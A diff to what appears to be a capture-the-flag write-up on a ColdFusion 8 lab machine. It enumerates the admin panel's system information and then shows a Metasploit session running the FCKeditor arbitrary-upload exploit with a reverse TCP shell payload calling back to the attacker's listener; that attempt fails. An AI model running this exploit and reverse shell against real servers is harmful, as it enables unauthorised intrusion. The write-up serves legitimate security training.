@@ -333,4 +333,120 @@ With this password `happyday`, let's go back to `http://10.10.10.11:8500/CFIDE/a
 
 We get directed to `10.10.10.11:8500/CFIDE/administrator/index.cfm` and successfully got in!
 
-## 6. Getting Flags?
+## 6. Enumerating ColdFusion Administrative Page
+Looking through the Administrator page, we could only see various Menus to view or modify.
+```
+Expand All / Collapse All
+
+Server Settings 
+...
+Data & Services
+...
+Debugging & Logging
+...
+Server Monitoring
+...
+Extensions
+...
+Event Gateways
+...
+Security
+...
+Packaging & Deployment
+...
+```
+Nothing interesting unfortunately. Suddenly, on the top right corner, I noticed a "System Information" button.
+
+Here's the System Information:
+```
+Server Details
+Server Product 	ColdFusion
+Version 	8,0,1,195765  
+Edition 	Developer  
+Serial Number 	Developer  
+Operating System 	Windows Vista  
+OS Version 	6.1  
+
+JVM Details
+Java Version 	1.6.0_04  
+Java Vendor 	Sun Microsystems Inc.  
+Java Vendor URL 	http://java.sun.com/
+Java Home 	C:\ColdFusion8\runtime\jre  
+Java File Encoding 	Cp1253  
+Java Default Locale 	el_GR  
+File Separator 	\  
+Path Separator 	;  
+Line Separator 	Chr(13)
+User Name 	tolis  
+User Home 	C:\Users\tolis  
+User Dir 	C:\ColdFusion8\runtime\bin  
+Java VM Specification Version 	1.0  
+Java VM Specification Vendor 	Sun Microsystems Inc.  
+Java VM Specification Name 	Java Virtual Machine Specification  
+Java VM Version 	10.0-b19  
+Java VM Vendor 	Sun Microsystems Inc.  
+Java VM Name 	Java HotSpot(TM) 64-Bit Server VM  
+Java Specification Version 	1.6  
+Java Specification Vendor 	Sun Microsystems Inc.  
+Java Specification Name 	Java Platform API Specification  
+Java Class Version 	50.0  
+...
+
+Printer Details
+Default Printer 	Microsoft XPS Document Writer
+Printers 	Microsoft XPS Document Writer 
+```
+Perfect. We now know it's a Windows Vista 6.1, running ColdFusion v8.0.1.195765 & JVM v1.6.0_04. We also know there is a user `tolis`, path `C:\Users\tolis`.
+
+## 7. Attacking Machine by Uploading Payload
+As we noted previously, it is perhaps time to deploy the [exploit with Metasploit module](https://www.rapid7.com/db/modules/exploit/windows/http/coldfusion_fckeditor/) titled `ColdFusion 8.0.1 Arbitrary File Upload and Execute` to upload a payload.
+```
+msf5 > use exploit/windows/http/coldfusion_fckeditor
+[*] No payload configured, defaulting to generic/shell_reverse_tcp
+msf5 exploit(windows/http/coldfusion_fckeditor) > set payload windows/x64/shell/reverse_tcp
+payload => windows/x64/shell/reverse_tcp
+msf5 exploit(windows/http/coldfusion_fckeditor) > show targets
+...
+msf5 exploit(windows/http/coldfusion_fckeditor) > set rhost 10.10.10.11
+rhost => 10.10.10.11
+msf5 exploit(windows/http/coldfusion_fckeditor) > set rport 8500
+rport => 8500
+...
+msf5 exploit(windows/http/coldfusion_fckeditor) > show options
+
+Module options (exploit/windows/http/coldfusion_fckeditor):
+
+   Name           Current Setting                                                             Required  Description
+   ----           ---------------                                                             --------  -----------
+   FCKEDITOR_DIR  /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm  no        The path to upload.cfm
+   Proxies                                                                                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS         10.10.10.11                                                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT          8500                                                                        yes       The target port (TCP)
+   SSL            false                                                                       no        Negotiate SSL/TLS for outgoing connections
+   VHOST                                                                                      no        HTTP server virtual host
+
+
+Payload options (windows/x64/shell/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.x.x      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Universal Windows Target
+
+
+msf5 exploit(windows/http/coldfusion_fckeditor) > exploit
+
+[*] Started reverse TCP handler on 10.10.x.x:4444 
+[*] Sending our POST request...
+[-] Upload Failed...
+[*] Exploit completed, but no session was created.
+```
+Within seconds of `[*] Sending our POST request...`, it returned with `[-] Upload Failed...`. This apparently is an unusual, quoting IppSec that every request to `10.10.10.11` takes about 30s to return something, there is no way this exploit would know that this request failed this quickly.
